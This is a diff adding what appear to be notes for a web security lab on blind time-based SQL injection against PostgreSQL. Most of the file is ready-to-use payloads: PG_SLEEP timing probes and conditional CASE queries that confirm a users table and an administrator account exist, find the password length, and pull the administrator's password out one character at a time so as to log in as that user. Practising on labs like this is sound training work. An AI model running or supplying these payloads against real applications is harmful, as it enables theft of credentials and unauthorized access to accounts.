@@ -1,0 +1,25 @@
+End Task:
+    1- Retrieve administrator credentials
+    2- login as administrator
+
+1- Check for Blind SQLi with time delays
+    ' || PG_SLEEP(5) -- -
+
+2- make a conditional payload 
+    if true, sleeps for 5 seconds, else sleep for 0 seconds
+    '; SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END-- -
+
+3- check if users table exist
+    '; SELECT CASE WHEN ((SELECT 'a' FROM users limit 1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -
+    if true, sleeps for 5 seconds, else sleep for 0 seconds
+
+4- check if the username "administrator" exists
+    '; SELECT CASE WHEN ((SELECT 'a' FROM users where username='administrator' limit 1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -
+
+5- Get the length of administrator's password
+    '; SELECT CASE WHEN ((SELECT LENGTH(PASSWORD) FROM users where username='administrator' limit 1)=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -
+    increase the length of the password you compare with until the response sleeps for 5 seconds.
+
+6- Retrieve password character by character
+    '; SELECT CASE WHEN ((SELECT SUBSTRING(PASSWORD, 1, 1) FROM users where username='administrator' limit 1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END -- -
+    for every character try a-z A-Z 0-9 until the response sleeps for 5 seconds, then move to the second character.
